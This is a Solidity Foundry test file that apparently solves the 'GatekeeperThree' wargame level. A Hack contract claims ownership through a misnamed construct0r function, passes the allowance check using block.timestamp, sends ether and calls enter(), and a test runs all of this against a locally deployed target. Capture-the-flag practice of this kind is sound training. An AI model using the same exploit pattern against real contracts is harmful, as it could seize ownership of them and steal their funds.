// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/Target.sol";

contract Hack {
	GatekeeperThree gate;

	constructor(address _gate) payable {
		if (msg.value <= 0.001 ether) revert("MINIMUM 0.0011 ether");
		gate = GatekeeperThree(payable(_gate));
	}

	function attack() public {
		// SimpleTrick trick;
		gate.construct0r();
		gate.createTrick();
		// trick = SimpleTrick(gate.trick());
		gate.getAllowance(block.timestamp);
		(bool success, ) = payable(address(gate)).call{value: 0.0011 ether}("");
		require(success, "Sending ether not ok!");
		gate.enter();
	}
}

contract CounterTest is Test {
	address player = makeAddr("0xPlayer");
	address admin = makeAddr("0xAdmin");
	GatekeeperThree gate;
	SimpleTrick trick;

    function setUp() public {
		vm.startPrank(admin);
		gate = new GatekeeperThree();
		vm.stopPrank();
		vm.deal(player, 1 ether);
    }

	function test_gate_one() public {
		vm.startPrank(player);
		Hack hack = new Hack{value: 0.002 ether}(address(gate));
		hack.attack();
	}

	receive() external payable {}
}
